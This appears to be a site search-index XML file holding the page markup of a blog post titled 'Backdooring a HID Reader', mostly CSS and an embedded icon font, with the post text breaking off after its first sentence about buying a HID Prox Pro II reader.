<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2020/11/03/Backdooring-a-HID-Reader/"/>
      <url>2020/11/03/Backdooring-a-HID-Reader/</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="date" content="2020-11-03 02:16:58"><meta name="tags" content=""><style>body {  max-width: 980px;  border: 1px solid #ddd;  outline: 1300px solid #fff;  margin: 16px auto;}body .markdown-body{  padding: 45px;}@font-face {  font-family: fontawesome-mini;  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');}.markdown-body {  font-family: sans-serif;  -ms-text-size-adjust: 100%;  -webkit-text-size-adjust: 100%;  color: #333333;  overflow: hidden;  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;  font-size: 16px;  line-height: 1.6;  word-wrap: break-word;}.markdown-body a {  background: transparent;}.markdown-body a:active,.markdown-body a:hover {  outline: 0;}.markdown-body b,.markdown-body strong {  font-weight: bold;}.markdown-body mark {  background: #ff0;  color: #000;  font-style: italic;  font-weight: bold;}.markdown-body sub,.markdown-body sup {  font-size: 75%;  line-height: 0;  position: relative;  vertical-align: baseline;}.markdown-body sup {  top: -0.5em;}.markdown-body sub {  bottom: -0.25em;}.markdown-body h1 {  font-size: 2em;  margin: 0.67em 0;}.markdown-body img {  border: 0;}.markdown-body hr {  -moz-box-sizing: content-box;  box-sizing: content-box;  height: 0;}.markdown-body pre {  overflow: auto;}.markdown-body code,.markdown-body kbd,.markdown-body pre,.markdown-body samp {  font-family: monospace, monospace;  font-size: 1em;}.markdown-body input {  color: inherit;  font: inherit;  margin: 0;}.markdown-body html input[disabled] {  cursor: default;}.markdown-body input {  line-height: normal;}.markdown-body input[type="checkbox"] {  box-sizing: border-box;  padding: 0;}.markdown-body table {  border-collapse: collapse;  border-spacing: 0;}.markdown-body td,.markdown-body th {  padding: 0;}.markdown-body .codehilitetable {  border: 0;  border-spacing: 0;}.markdown-body .codehilitetable tr {  border: 0;}.markdown-body .codehilitetable pre,.markdown-body .codehilitetable div.codehilite {  margin: 0;}.markdown-body .linenos,.markdown-body .code,.markdown-body .codehilitetable td {  border: 0;  padding: 0;}.markdown-body td:not(.linenos) .linenodiv {  padding: 0 !important;}.markdown-body .code {  width: 100%;}.markdown-body .linenos div pre,.markdown-body .linenodiv pre,.markdown-body .linenodiv {  border: 0;  -webkit-border-radius: 0;  -moz-border-radius: 0;  border-radius: 0;  -webkit-border-top-left-radius: 3px;  -webkit-border-bottom-left-radius: 3px;  -moz-border-radius-topleft: 3px;  -moz-border-radius-bottomleft: 3px;  border-top-left-radius: 3px;  border-bottom-left-radius: 3px;}.markdown-body .code div pre,.markdown-body .code div {  border: 0;  -webkit-border-radius: 0;  -moz-border-radius: 0;  border-radius: 0;  -webkit-border-top-right-radius: 3px;  -webkit-border-bottom-right-radius: 3px;  -moz-border-radius-topright: 3px;  -moz-border-radius-bottomright: 3px;  border-top-right-radius: 3px;  border-bottom-right-radius: 3px;}.markdown-body * {  -moz-box-sizing: border-box;  box-sizing: border-box;}.markdown-body input {  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";  line-height: 1.4;}.markdown-body a {  color: #4183c4;  text-decoration: none;}.markdown-body a:hover,.markdown-body a:focus,.markdown-body a:active {  text-decoration: underline;}.markdown-body hr {  height: 0;  margin: 15px 0;  overflow: hidden;  background: transparent;  border: 0;  border-bottom: 1px solid #ddd;}.markdown-body hr:before,.markdown-body hr:after {  display: table;  content: " ";}.markdown-body hr:after {  clear: both;}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6 {  margin-top: 15px;  margin-bottom: 15px;  line-height: 1.1;}.markdown-body h1 {  font-size: 30px;}.markdown-body h2 {  font-size: 21px;}.markdown-body h3 {  font-size: 16px;}.markdown-body h4 {  font-size: 14px;}.markdown-body h5 {  font-size: 12px;}.markdown-body h6 {  font-size: 11px;}.markdown-body blockquote {  margin: 0;}.markdown-body ul,.markdown-body ol {  padding: 0;  margin-top: 0;  margin-bottom: 0;}.markdown-body ol ol,.markdown-body ul ol {  list-style-type: lower-roman;}.markdown-body ul ul ol,.markdown-body ul ol ol,.markdown-body ol ul ol,.markdown-body ol ol ol {  list-style-type: lower-alpha;}.markdown-body dd {  margin-left: 0;}.markdown-body code,.markdown-body pre,.markdown-body samp {  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;  font-size: 12px;}.markdown-body pre {  margin-top: 0;  margin-bottom: 0;}.markdown-body kbd {  background-color: #e7e7e7;  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);  background-image: linear-gradient(#fefefe, #e7e7e7);  background-repeat: repeat-x;  border-radius: 2px;  border: 1px solid #cfcfcf;  color: #000;  padding: 3px 5px;  line-height: 10px;  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;  display: inline-block;}.markdown-body>*:first-child {  margin-top: 0 !important;}.markdown-body>*:last-child {  margin-bottom: 0 !important;}.markdown-body .headerlink {  font: normal 400 16px fontawesome-mini;  vertical-align: middle;  margin-left: -16px;  float: left;  display: inline-block;  text-decoration: none;  opacity: 0;  color: #333;}.markdown-body .headerlink:focus {  outline: none;}.markdown-body h1 .headerlink {  margin-top: 0.8rem;}.markdown-body h2 .headerlink,.markdown-body h3 .headerlink {  margin-top: 0.6rem;}.markdown-body h4 .headerlink {  margin-top: 0.2rem;}.markdown-body h5 .headerlink,.markdown-body h6 .headerlink {  margin-top: 0;}.markdown-body .headerlink:hover,.markdown-body h1:hover .headerlink,.markdown-body h2:hover .headerlink,.markdown-body h3:hover .headerlink,.markdown-body h4:hover .headerlink,.markdown-body h5:hover .headerlink,.markdown-body h6:hover .headerlink {  opacity: 1;  text-decoration: none;}.markdown-body h1 {  padding-bottom: 0.3em;  font-size: 2.25em;  line-height: 1.2;  border-bottom: 1px solid #eee;}.markdown-body h2 {  padding-bottom: 0.3em;  font-size: 1.75em;  line-height: 1.225;  border-bottom: 1px solid #eee;}.markdown-body h3 {  font-size: 1.5em;  line-height: 1.43;}.markdown-body h4 {  font-size: 1.25em;}.markdown-body h5 {  font-size: 1em;}.markdown-body h6 {  font-size: 1em;  color: #777;}.markdown-body p,.markdown-body blockquote,.markdown-body ul,.markdown-body ol,.markdown-body dl,.markdown-body table,.markdown-body pre,.markdown-body .admonition {  margin-top: 0;  margin-bottom: 16px;}.markdown-body hr {  height: 4px;  padding: 0;  margin: 16px 0;  background-color: #e7e7e7;  border: 0 none;}.markdown-body ul,.markdown-body ol {  padding-left: 2em;}.markdown-body ul ul,.markdown-body ul ol,.markdown-body ol ol,.markdown-body ol ul {  margin-top: 0;  margin-bottom: 0;}.markdown-body li>p {  margin-top: 16px;}.markdown-body dl {  padding: 0;}.markdown-body dl dt {  padding: 0;  margin-top: 16px;  font-size: 1em;  font-style: italic;  font-weight: bold;}.markdown-body dl dd {  padding: 0 16px;  margin-bottom: 16px;}.markdown-body blockquote {  padding: 0 15px;  color: #777;  border-left: 4px solid #ddd;}.markdown-body blockquote>:first-child {  margin-top: 0;}.markdown-body blockquote>:last-child {  margin-bottom: 0;}.markdown-body table {  display: block;  width: 100%;  overflow: auto;  word-break: normal;  word-break: keep-all;}.markdown-body table th {  font-weight: bold;}.markdown-body table th,.markdown-body table td {  padding: 6px 13px;  border: 1px solid #ddd;}.markdown-body table tr {  background-color: #fff;  border-top: 1px solid #ccc;}.markdown-body table tr:nth-child(2n) {  background-color: #f8f8f8;}.markdown-body img {  max-width: 100%;  -moz-box-sizing: border-box;  box-sizing: border-box;}.markdown-body code,.markdown-body samp {  padding: 0;  padding-top: 0.2em;  padding-bottom: 0.2em;  margin: 0;  font-size: 85%;  background-color: rgba(0,0,0,0.04);  border-radius: 3px;}.markdown-body code:before,.markdown-body code:after {  letter-spacing: -0.2em;  content: "\00a0";}.markdown-body pre>code {  padding: 0;  margin: 0;  font-size: 100%;  word-break: normal;  white-space: pre;  background: transparent;  border: 0;}.markdown-body .codehilite {  margin-bottom: 16px;}.markdown-body .codehilite pre,.markdown-body pre {  padding: 16px;  overflow: auto;  font-size: 85%;  line-height: 1.45;  background-color: #f7f7f7;  border-radius: 3px;}.markdown-body .codehilite pre {  margin-bottom: 0;  word-break: normal;}.markdown-body pre {  word-wrap: normal;}.markdown-body pre code {  display: inline;  max-width: initial;  padding: 0;  margin: 0;  overflow: initial;  line-height: inherit;  word-wrap: normal;  background-color: transparent;  border: 0;}.markdown-body pre code:before,.markdown-body pre code:after {  content: normal;}/* Admonition */.markdown-body .admonition {  -webkit-border-radius: 3px;  -moz-border-radius: 3px;  position: relative;  border-radius: 3px;  border: 1px solid #e0e0e0;  border-left: 6px solid #333;  padding: 10px 10px 10px 30px;}.markdown-body .admonition table {  color: #333;}.markdown-body .admonition p {  padding: 0;}.markdown-body .admonition-title {  font-weight: bold;  margin: 0;}.markdown-body .admonition>.admonition-title {  color: #333;}.markdown-body .attention>.admonition-title {  color: #a6d796;}.markdown-body .caution>.admonition-title {  color: #d7a796;}.markdown-body .hint>.admonition-title {  color: #96c6d7;}.markdown-body .danger>.admonition-title {  color: #c25f77;}.markdown-body .question>.admonition-title {  color: #96a6d7;}.markdown-body .note>.admonition-title {  color: #d7c896;}.markdown-body .admonition:before,.markdown-body .attention:before,.markdown-body .caution:before,.markdown-body .hint:before,.markdown-body .danger:before,.markdown-body .question:before,.markdown-body .note:before {  font: normal normal 16px fontawesome-mini;  -moz-osx-font-smoothing: grayscale;  -webkit-user-select: none;  -moz-user-select: none;  -ms-user-select: none;  user-select: none;  line-height: 1.5;  color: #333;  position: absolute;  left: 0;  top: 0;  padding-top: 10px;  padding-left: 10px;}.markdown-body .admonition:before {  content: "\f056\00a0";  color: 333;}.markdown-body .attention:before {  content: "\f058\00a0";  color: #a6d796;}.markdown-body .caution:before {  content: "\f06a\00a0";  color: #d7a796;}.markdown-body .hint:before {  content: "\f05a\00a0";  color: #96c6d7;}.markdown-body .danger:before {  content: "\f057\00a0";  color: #c25f77;}.markdown-body .question:before {  content: "\f059\00a0";  color: #96a6d7;}.markdown-body .note:before {  content: "\f040\00a0";  color: #d7c896;}.markdown-body .admonition::after {  content: normal;}.markdown-body .attention {  border-left: 6px solid #a6d796;}.markdown-body .caution {  border-left: 6px solid #d7a796;}.markdown-body .hint {  border-left: 6px solid #96c6d7;}.markdown-body .danger {  border-left: 6px solid #c25f77;}.markdown-body .question {  border-left: 6px solid #96a6d7;}.markdown-body .note {  border-left: 6px solid #d7c896;}.markdown-body .admonition>*:first-child {  margin-top: 0 !important;}.markdown-body .admonition>*:last-child {  margin-bottom: 0 !important;}/* progress bar*/.markdown-body .progress {  display: block;  width: 300px;  margin: 10px 0;  height: 24px;  -webkit-border-radius: 3px;  -moz-border-radius: 3px;  border-radius: 3px;  background-color: #ededed;  position: relative;  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);}.markdown-body .progress-label {  position: absolute;  text-align: center;  font-weight: bold;  width: 100%; margin: 0;  line-height: 24px;  color: #333;  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;  -webkit-font-smoothing: antialiased !important;  white-space: nowrap;  overflow: hidden;}.markdown-body .progress-bar {  height: 24px;  float: left;  -webkit-border-radius: 3px;  -moz-border-radius: 3px;  border-radius: 3px;  background-color: #96c6d7;  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);  background-size: 30px 30px;  background-image: -webkit-linear-gradient(    135deg, rgba(255, 255, 255, .4) 27%,    transparent 27%,    transparent 52%, rgba(255, 255, 255, .4) 52%,    rgba(255, 255, 255, .4) 77%,    transparent 77%, transparent  );  background-image: -moz-linear-gradient(    135deg,    rgba(255, 255, 255, .4) 27%, transparent 27%,    transparent 52%, rgba(255, 255, 255, .4) 52%,    rgba(255, 255, 255, .4) 77%, transparent 77%,    transparent  );  background-image: -ms-linear-gradient(    135deg,    rgba(255, 255, 255, .4) 27%, transparent 27%,    transparent 52%, rgba(255, 255, 255, .4) 52%,    rgba(255, 255, 255, .4) 77%, transparent 77%,    transparent  );  background-image: -o-linear-gradient(    135deg,    rgba(255, 255, 255, .4) 27%, transparent 27%,    transparent 52%, rgba(255, 255, 255, .4) 52%,    rgba(255, 255, 255, .4) 77%, transparent 77%,    transparent  );  background-image: linear-gradient(    135deg,    rgba(255, 255, 255, .4) 27%, transparent 27%,    transparent 52%, rgba(255, 255, 255, .4) 52%,    rgba(255, 255, 255, .4) 77%, transparent 77%,    transparent  );}.markdown-body .progress-100plus .progress-bar {  background-color: #a6d796;}.markdown-body .progress-80plus .progress-bar {  background-color: #c6d796;}.markdown-body .progress-60plus .progress-bar {  background-color: #d7c896;}.markdown-body .progress-40plus .progress-bar {  background-color: #d7a796;}.markdown-body .progress-20plus .progress-bar {  background-color: #d796a6;}.markdown-body .progress-0plus .progress-bar {  background-color: #c25f77;}.markdown-body .candystripe-animate .progress-bar{  -webkit-animation: animate-stripes 3s linear infinite;  -moz-animation: animate-stripes 3s linear infinite;  animation: animate-stripes 3s linear infinite;}@-webkit-keyframes animate-stripes {  0% {    background-position: 0 0;  }  100% {    background-position: 60px 0;  }}@-moz-keyframes animate-stripes {  0% {    background-position: 0 0;  }  100% {    background-position: 60px 0;  }}@keyframes animate-stripes {  0% {    background-position: 0 0;  }  100% {    background-position: 60px 0;  }}.markdown-body .gloss .progress-bar {  box-shadow:    inset 0 4px 12px rgba(255, 255, 255, .7),    inset 0 -12px 0 rgba(0, 0, 0, .05);}/* MultiMarkdown Critic Blocks */.markdown-body .critic_mark {  background: #ff0;}.markdown-body .critic_delete {  color: #c82829;  text-decoration: line-through;}.markdown-body .critic_insert {  color: #718c00 ;  text-decoration: underline;}.markdown-body .critic_comment {  color: #8e908c;  font-style: italic;}.markdown-body .headeranchor {  font: normal normal 16px fontawesome-mini;  line-height: 1;  display: inline-block;  text-decoration: none;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;  -webkit-user-select: none;  -moz-user-select: none;  -ms-user-select: none;  user-select: none;}.headeranchor:before {  content: '\e157';}.markdown-body .task-list-item {  list-style-type: none;}.markdown-body .task-list-item+.task-list-item {  margin-top: 3px;}.markdown-body .task-list-item input {  margin: 0 4px 0.25em -20px;  vertical-align: middle;}/* Media */@media only screen and (min-width: 480px) {  .markdown-body {    font-size:14px;  }}@media only screen and (min-width: 768px) {  .markdown-body {    font-size:16px;  }}@media print {  .markdown-body * {    background: transparent !important;    color: black !important;    filter:none !important;    -ms-filter: none !important;  }  .markdown-body {    font-size:12pt;    max-width:100%;    outline:none;    border: 0;  }  .markdown-body a,  .markdown-body a:visited {    text-decoration: underline;  }  .markdown-body .headeranchor-link {    display: none;  }  .markdown-body a[href]:after {    content: " (" attr(href) ")";  }  .markdown-body abbr[title]:after {    content: " (" attr(title) ")";  }  .markdown-body .ir a:after,  .markdown-body a[href^="javascript:"]:after,  .markdown-body a[href^="#"]:after {    content: "";  }  .markdown-body pre {    white-space: pre;    white-space: pre-wrap;    word-wrap: break-word;  }  .markdown-body pre,  .markdown-body blockquote {    border: 1px solid #999;    padding-right: 1em;    page-break-inside: avoid;  }  .markdown-body .progress,  .markdown-body .progress-bar {    -moz-box-shadow: none;    -webkit-box-shadow: none;    box-shadow: none;  }  .markdown-body .progress {    border: 1px solid #ddd;  }  .markdown-body .progress-bar {    height: 22px;    border-right: 1px solid #ddd;  }  .markdown-body tr,  .markdown-body img {    page-break-inside: avoid;  }  .markdown-body img {    max-width: 100% !important;  }  .markdown-body p,  .markdown-body h2,  .markdown-body h3 {    orphans: 3;    widows: 3;  }  .markdown-body h2,  .markdown-body h3 {    page-break-after: avoid;  }}</style><style>/*GitHub*/.codehilite {background-color:#fff;color:#333333;}.codehilite .hll {background-color:#ffffcc;}.codehilite .c{color:#999988;font-style:italic}.codehilite .err{color:#a61717;background-color:#e3d2d2}.codehilite .k{font-weight:bold}.codehilite .o{font-weight:bold}.codehilite .cm{color:#999988;font-style:italic}.codehilite .cp{color:#999999;font-weight:bold}.codehilite .c1{color:#999988;font-style:italic}.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}.codehilite .gd{color:#000000;background-color:#ffdddd}.codehilite .ge{font-style:italic}.codehilite .gr{color:#aa0000}.codehilite .gh{color:#999999}.codehilite .gi{color:#000000;background-color:#ddffdd}.codehilite .go{color:#888888}.codehilite .gp{color:#555555}.codehilite .gs{font-weight:bold}.codehilite .gu{color:#800080;font-weight:bold}.codehilite .gt{color:#aa0000}.codehilite .kc{font-weight:bold}.codehilite .kd{font-weight:bold}.codehilite .kn{font-weight:bold}.codehilite .kp{font-weight:bold}.codehilite .kr{font-weight:bold}.codehilite .kt{color:#445588;font-weight:bold}.codehilite .m{color:#009999}.codehilite .s{color:#dd1144}.codehilite .n{color:#333333}.codehilite .na{color:teal}.codehilite .nb{color:#0086b3}.codehilite .nc{color:#445588;font-weight:bold}.codehilite .no{color:teal}.codehilite .ni{color:purple}.codehilite .ne{color:#990000;font-weight:bold}.codehilite .nf{color:#990000;font-weight:bold}.codehilite .nn{color:#555555}.codehilite .nt{color:navy}.codehilite .nv{color:teal}.codehilite .ow{font-weight:bold}.codehilite .w{color:#bbbbbb}.codehilite .mf{color:#009999}.codehilite .mh{color:#009999}.codehilite .mi{color:#009999}.codehilite .mo{color:#009999}.codehilite .sb{color:#dd1144}.codehilite .sc{color:#dd1144}.codehilite .sd{color:#dd1144}.codehilite .s2{color:#dd1144}.codehilite .se{color:#dd1144}.codehilite .sh{color:#dd1144}.codehilite .si{color:#dd1144}.codehilite .sx{color:#dd1144}.codehilite .sr{color:#009926}.codehilite .s1{color:#dd1144}.codehilite .ss{color:#990073}.codehilite .bp{color:#999999}.codehilite .vc{color:teal}.codehilite .vg{color:teal}.codehilite .vi{color:teal}.codehilite .il{color:#009999}.codehilite .gc{color:#999;background-color:#EAF2F5}</style><title>Backdooring a HID Reader</title></head><body><article class="markdown-body"><p>A while back, I bought a HID Prox Pro II on eBay for some long-forgotten experiment — likely this. Outside of being well documented and cheaply available, <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/shakataganai" title="GitHub User: shakataganai">@shakataganai</a> wrote a fantastic article about how to connect it to an 